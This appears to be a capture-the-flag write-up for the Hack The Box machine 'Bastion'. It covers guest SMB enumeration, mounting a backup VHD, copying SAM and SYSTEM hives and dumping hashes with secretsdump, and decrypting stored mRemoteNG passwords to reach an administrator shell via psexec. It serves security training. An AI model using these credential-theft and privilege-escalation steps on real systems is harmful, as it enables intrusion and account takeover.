# Bastion Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA bastion 10.10.10.134``

22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)

135/tcp open  msrpc        Microsoft Windows RPC

445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds                                                                            

# ${{\color{purple}Initial Foothold}}\ $  

### smb discovery of a backups repository **:white_check_mark:**

``smbclient -U 'guest%' -L //10.10.10.134``

``smbclient -U 'guest%' //10.10.10.134/Backups``

``mkdir /mnt/smb``

### As a first step I mounted the backups folder of the smb share

``mount -t cifs //10.10.10.134/Backups /mnt/smb``

### In a second time I mounted the .vhd file which is a virtual disk
### To mount a .vhd file on linux it's possible to use guestmount :

``apt install guestmount``

``mkdir /mnt/vhd``

``guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd``

### It can take time if the vhd file is big !

``cd /Windows/System32/config``

``cp SAM SYSTEM /home/kali/Documents/htb/bastion``

![bastion2](https://user-images.githubusercontent.com/123066149/218385163-14ed7ce6-ac30-4d45-acaf-929e8253b7a8.PNG)


``/usr/bin/impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local``

![bastion1](https://user-images.githubusercontent.com/123066149/218384858-42bb0c03-16c4-4561-aca4-1d63c05ee822.PNG)

### After having found the hash of the users with secretsdump it is possible to connect on the machine with the user L4mpje


# ${{\color{purple}Exploitation}}\ $

# ${{\color{purple}Privilege Escalation}}\ $

### There is an uncommon tool that is mRmoteNG in  C:\Program Files\mRemoteNG
> google mremoteng extract password

``git clone https://github.com/haseebT/mRemoteNG-Decrypt``

### To find hidden files

``dir \a``  

### Retrieve the config file :

``C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml``

python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==

![image](https://user-images.githubusercontent.com/123066149/218386180-fbcfe581-776c-4815-b696-9bab0c1dedd0.png)

### It is possible to use this password to make a ssh in administrator on the box or use psexec

``/usr/bin/impacket-psexec Administrator@10.10.10.134``

![image](https://user-images.githubusercontent.com/123066149/218386923-00d9227d-f7ab-41f8-a12e-efc91fe1a06b.png)

# ${{\color{purple}Points of Improvement}}\ $


- Look at the dates in the files on windows
